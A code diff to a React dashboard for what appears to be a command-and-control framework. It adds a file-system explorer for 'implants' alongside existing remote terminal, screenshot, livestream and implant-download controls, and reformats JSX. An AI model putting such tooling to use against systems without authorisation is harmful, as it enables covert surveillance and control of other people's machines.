@@ -3,6 +3,8 @@ import Terminal from "../components/Terminal"; // Adjust path if needed
 import DownloadOptionsModal from "../components/DownloadOptionsModal"; // Adjust path
 import GenerateImplantOSModal from "./GenerateImplantOSModal.js"; // Adjust path
 import ScreenshotViewer from "../components/ScreenshotViewer"; // Adjust path
+import FileSystemExplorer from '../components/FileSystemExplorer'; // Adjust path if needed
+
 
 const API_BASE = "/api";
 const REFRESH_INTERVAL = 5000; // For general implant list
@@ -137,7 +139,19 @@ function Dashboard() {
   });
   const screenshotPollIntervalRef = useRef(null);
 
+  const [fileExplorerState, setFileExplorerState] = useState({
+  isOpen: false,
+  implantId: null,
+});
 
+// Inside Dashboard function
+const openFileExplorer = (implantToken) => {
+  setFileExplorerState({ isOpen: true, implantId: implantToken });
+};
+
+const closeFileExplorer = () => {
+  setFileExplorerState({ isOpen: false, implantId: null });
+};
   const displayNotification = (message, type = "success", duration = 5000) => {
     if (notificationTimeoutRef.current) clearTimeout(notificationTimeoutRef.current);
     setNotification({ message, type, show: true });
@@ -503,22 +517,32 @@ function Dashboard() {
         selectedOS={selectedOSForGeneration}
         setSelectedOS={setSelectedOSForGeneration}
       />
-      
+
       <ScreenshotViewer
         isOpen={screenshotViewerState.isOpen}
         onClose={closeScreenshotViewer}
         implantId={screenshotViewerState.implantId}
-        screenshots={screenshotViewerState.screenshots} 
+        screenshots={screenshotViewerState.screenshots}
         initialScreenshotPath={screenshotViewerState.initialPath}
         mode={screenshotViewerState.mode}
         onStreamStopRequested={handleStreamStopRequested} // Pass the handler
       />
 
+      {fileExplorerState.isOpen && fileExplorerState.implantId && (
+        <FileSystemExplorer
+          implantID={fileExplorerState.implantId}
+          onClose={closeFileExplorer}
+          displayNotification={displayNotification} 
+        />
+      )}
+
       <div className="container mx-auto p-4 md:p-6 bg-gray-100 min-h-screen">
         <div className="bg-white shadow-xl rounded-lg p-6">
           <div className="flex flex-col md:flex-row justify-between items-start mb-6">
             <div className="flex-grow mb-4 md:mb-0">
-              <h2 className="text-2xl md:text-3xl font-bold text-gray-800 mb-4">Implant Dashboard</h2>
+              <h2 className="text-2xl md:text-3xl font-bold text-gray-800 mb-4">
+                Implant Dashboard
+              </h2>
               <button
                 onClick={() => setIsGenerateOSModalOpen(true)}
                 className="bg-indigo-600 text-white px-5 py-2.5 rounded-lg hover:bg-indigo-700 transition-colors shadow-md focus:outline-none focus:ring-2 focus:ring-indigo-500 focus:ring-opacity-50"
@@ -527,29 +551,53 @@ function Dashboard() {
               </button>
             </div>
             <div className="p-4 border border-gray-200/75 rounded-lg bg-slate-50 shadow-md w-full max-w-md">
-              <h3 className="text-base font-semibold text-gray-700 mb-1">Default C2 Server</h3>
-              <p className="text-xs text-gray-500 mb-3">Set a default IP or hostname for downloads.</p>
+              <h3 className="text-base font-semibold text-gray-700 mb-1">
+                Default C2 Server
+              </h3>
+              <p className="text-xs text-gray-500 mb-3">
+                Set a default IP or hostname for downloads.
+              </p>
               <div className="flex flex-col sm:flex-row sm:items-end sm:space-x-2">
                 <div className="flex-grow mb-2 sm:mb-0">
-                  <label htmlFor="global_c2_ip" className="sr-only">IP Address / Hostname</label>
+                  <label htmlFor="global_c2_ip" className="sr-only">
+                    IP Address / Hostname
+                  </label>
                   <input
-                    type="text" id="global_c2_ip" value={inputGlobalC2IP}
+                    type="text"
+                    id="global_c2_ip"
+                    value={inputGlobalC2IP}
                     onChange={(e) => setInputGlobalC2IP(e.target.value)}
                     placeholder="C2 IP or Hostname (e.g., 1.2.3.4:8080)"
                     className="w-full px-2.5 py-1.5 border border-gray-300 rounded-md shadow-sm focus:outline-none focus:ring-1 focus:ring-indigo-500 focus:border-indigo-500 text-xs text-gray-900 transition-shadow duration-150 hover:shadow"
                   />
                 </div>
-                <button onClick={handleSaveGlobalC2IP}
+                <button
+                  onClick={handleSaveGlobalC2IP}
                   className="w-full sm:w-auto px-3 py-1.5 text-xs font-medium text-white bg-indigo-600 rounded-md hover:bg-indigo-700 focus:outline-none focus:ring-2 focus:ring-indigo-500 focus:ring-offset-1 focus:ring-offset-slate-50 transition-colors duration-150 ease-in-out shadow hover:shadow-md whitespace-nowrap"
-                >Save C2</button>
+                >
+                  Save C2
+                </button>
               </div>
-              {globalC2IP && <p className="mt-2 text-xs text-gray-600">Current: <strong className="font-mono bg-indigo-100 text-indigo-600 px-1 py-0.5 rounded-sm">{globalC2IP}</strong></p>}
-              {!globalC2IP && <p className="mt-2 text-xs text-gray-500 italic">No default C2 set.</p>}
+              {globalC2IP && (
+                <p className="mt-2 text-xs text-gray-600">
+                  Current:{" "}
+                  <strong className="font-mono bg-indigo-100 text-indigo-600 px-1 py-0.5 rounded-sm">
+                    {globalC2IP}
+                  </strong>
+                </p>
+              )}
+              {!globalC2IP && (
+                <p className="mt-2 text-xs text-gray-500 italic">
+                  No default C2 set.
+                </p>
+              )}
             </div>
           </div>
 
           {implants.length === 0 && (
-            <p className="text-gray-500 text-center py-10">No implants found. Generate one to get started!</p>
+            <p className="text-gray-500 text-center py-10">
+              No implants found. Generate one to get started!
+            </p>
           )}
 
           {implants.length > 0 && (
@@ -557,59 +605,121 @@ function Dashboard() {
               <table className="w-full border-collapse text-left">
                 <thead className="bg-gray-200">
                   <tr>
-                    <th className="p-3 text-sm font-semibold text-gray-700 uppercase tracking-wider">#</th>
-                    <th className="p-3 text-sm font-semibold text-gray-700 uppercase tracking-wider">Token</th>
-                    <th className="p-3 text-sm font-semibold text-gray-700 uppercase tracking-wider">OS</th>
-                    <th className="p-3 text-sm font-semibold text-gray-700 uppercase tracking-wider">Status</th>
-                    <th className="p-3 text-sm font-semibold text-gray-700 uppercase tracking-wider">Last Seen</th>
-                    <th className="p-3 text-sm font-semibold text-gray-700 uppercase tracking-wider">IP Address</th>
-                    <th className="p-3 text-sm font-semibold text-gray-700 uppercase tracking-wider text-center">Actions</th>
+                    <th className="p-3 text-sm font-semibold text-gray-700 uppercase tracking-wider">
+                      #
+                    </th>
+                    <th className="p-3 text-sm font-semibold text-gray-700 uppercase tracking-wider">
+                      Token
+                    </th>
+                    <th className="p-3 text-sm font-semibold text-gray-700 uppercase tracking-wider">
+                      OS
+                    </th>
+                    <th className="p-3 text-sm font-semibold text-gray-700 uppercase tracking-wider">
+                      Status
+                    </th>
+                    <th className="p-3 text-sm font-semibold text-gray-700 uppercase tracking-wider">
+                      Last Seen
+                    </th>
+                    <th className="p-3 text-sm font-semibold text-gray-700 uppercase tracking-wider">
+                      IP Address
+                    </th>
+                    <th className="p-3 text-sm font-semibold text-gray-700 uppercase tracking-wider text-center">
+                      Actions
+                    </th>
                   </tr>
                 </thead>
                 <tbody className="bg-white divide-y divide-gray-200">
                   {implants.map((implant, index) => (
-                    <tr key={implant.unique_token} className="hover:bg-gray-50 transition-colors">
-                      <td className="p-3 text-sm text-gray-700 whitespace-nowrap">{index + 1}</td>
-                      <td className="p-3 text-sm text-gray-700 font-mono whitespace-nowrap">{implant.unique_token}</td>
-                      <td className="p-3 text-sm text-gray-700 whitespace-nowrap capitalize">{implant.target_os || 'N/A'}</td>
+                    <tr
+                      key={implant.unique_token}
+                      className="hover:bg-gray-50 transition-colors"
+                    >
                       <td className="p-3 text-sm text-gray-700 whitespace-nowrap">
-                        <span className={`px-2.5 py-0.5 inline-flex text-xs leading-5 font-semibold rounded-full ${getStatusColor(implant.status)}`}>
-                          {implant.status || 'N/A'}
+                        {index + 1}
+                      </td>
+                      <td className="p-3 text-sm text-gray-700 font-mono whitespace-nowrap">
+                        {implant.unique_token}
+                      </td>
+                      <td className="p-3 text-sm text-gray-700 whitespace-nowrap capitalize">
+                        {implant.target_os || "N/A"}
+                      </td>
+                      <td className="p-3 text-sm text-gray-700 whitespace-nowrap">
+                        <span
+                          className={`px-2.5 py-0.5 inline-flex text-xs leading-5 font-semibold rounded-full ${getStatusColor(
+                            implant.status
+                          )}`}
+                        >
+                          {implant.status || "N/A"}
                         </span>
                       </td>
                       <td className="p-3 text-sm text-gray-700 whitespace-nowrap">
-                        {implant.status?.toLowerCase() === 'new' || !implant.last_seen ? 'Never' : new Date(implant.last_seen).toLocaleString()}
+                        {implant.status?.toLowerCase() === "new" ||
+                        !implant.last_seen
+                          ? "Never"
+                          : new Date(implant.last_seen).toLocaleString()}
                       </td>
-                      <td className="p-3 text-sm text-gray-700 whitespace-nowrap">{implant.ip_address || 'N/A'}</td>
+                      <td className="p-3 text-sm text-gray-700 whitespace-nowrap">
+                        {implant.ip_address || "N/A"}
+                      </td>
                       <td className="p-3 text-sm text-gray-700 whitespace-nowrap text-center">
                         <div className="flex flex-wrap justify-center items-center gap-1">
-                            <button
+                          <button
                             className="bg-sky-500 text-white px-3 py-1.5 rounded-md hover:bg-sky-600 transition-colors text-xs font-medium"
-                            onClick={() => handleOpenTerminal(implant.unique_token)} title="Open terminal"
-                            >Terminal</button>
-                            <button
-                                className="bg-teal-500 text-white px-3 py-1.5 rounded-md hover:bg-teal-600 transition-colors text-xs font-medium"
-                                onClick={() => handleViewScreenshotsButton(implant.unique_token)}
-                                title="View all screenshots for this implant"
-                            >Screenshots</button>
-                            
-                            <button
-                            className="bg-purple-500 text-white px-3 py-1.5 rounded-md hover:bg-purple-600 transition-colors text-xs font-medium"
-                            onClick={() => handleStartStreamButton(implant.unique_token)}
-                            title="Start Livestream Feed and Open Viewer"
-                            >
-                            Start Stream
-                            </button>
-                            {/* Stop Stream button is removed here */}
+                            onClick={() =>
+                              handleOpenTerminal(implant.unique_token)
+                            }
+                            title="Open terminal"
+                          >
+                            Terminal
+                          </button>
+                          <button
+                            className="bg-teal-500 text-white px-3 py-1.5 rounded-md hover:bg-teal-600 transition-colors text-xs font-medium"
+                            onClick={() =>
+                              handleViewScreenshotsButton(implant.unique_token)
+                            }
+                            title="View all screenshots for this implant"
+                          >
+                            Screenshots
+                          </button>
 
-                            <button
+                          <button
+                            className="bg-purple-500 text-white px-3 py-1.5 rounded-md hover:bg-purple-600 transition-colors text-xs font-medium"
+                            onClick={() =>
+                              handleStartStreamButton(implant.unique_token)
+                            }
+                            title="Start Livestream Feed and Open Viewer"
+                          >
+                            Start Stream
+                          </button>
+
+                          <button
+                            className="bg-cyan-600 text-white px-3 py-1.5 rounded-md hover:bg-cyan-700 transition-colors text-xs font-medium"
+                            onClick={() =>
+                              openFileExplorer(implant.unique_token)
+                            }
+                            title="Open File Explorer"
+                          >
+                            File Explorer
+                          </button>
+
+                          <button
                             className="bg-yellow-500 text-white px-3 py-1.5 rounded-md hover:bg-yellow-600 transition-colors text-xs font-medium"
-                            onClick={() => openDownloadOptionsModal(implant.unique_token)} title="Download implant"
-                            >Download</button>
-                            <button
+                            onClick={() =>
+                              openDownloadOptionsModal(implant.unique_token)
+                            }
+                            title="Download implant"
+                          >
+                            Download
+                          </button>
+                          <button
                             className="bg-red-600 text-white px-3 py-1.5 rounded-md hover:bg-red-700 transition-colors text-xs font-medium"
-                            onClick={() => openDeleteConfirmation(implant.unique_token)} title="Delete implant"
-                            >Delete</button>
+                            onClick={() =>
+                              openDeleteConfirmation(implant.unique_token)
+                            }
+                            title="Delete implant"
+                          >
+                            Delete
+                          </button>
                         </div>
                       </td>
                     </tr>
@@ -623,13 +733,17 @@ function Dashboard() {
         {selectedImplantForTerminal && (
           <div
             className="fixed inset-0 bg-black bg-opacity-75 flex items-center justify-center p-4 z-[100] backdrop-blur-sm"
-            onClick={(e) => { if (e.target === e.currentTarget) handleCloseTerminal(); }}
+            onClick={(e) => {
+              if (e.target === e.currentTarget) handleCloseTerminal();
+            }}
           >
             <Terminal
-                implantID={selectedImplantForTerminal}
-                onClose={handleCloseTerminal}
-                openScreenshotViewer={openScreenshotViewer} // Pass for terminal to open screenshot viewer
-                extractScreenshotPathFromCmdOutput={extractScreenshotPathFromCmdOutput} 
+              implantID={selectedImplantForTerminal}
+              onClose={handleCloseTerminal}
+              openScreenshotViewer={openScreenshotViewer} // Pass for terminal to open screenshot viewer
+              extractScreenshotPathFromCmdOutput={
+                extractScreenshotPathFromCmdOutput
+              }
             />
           </div>
         )}
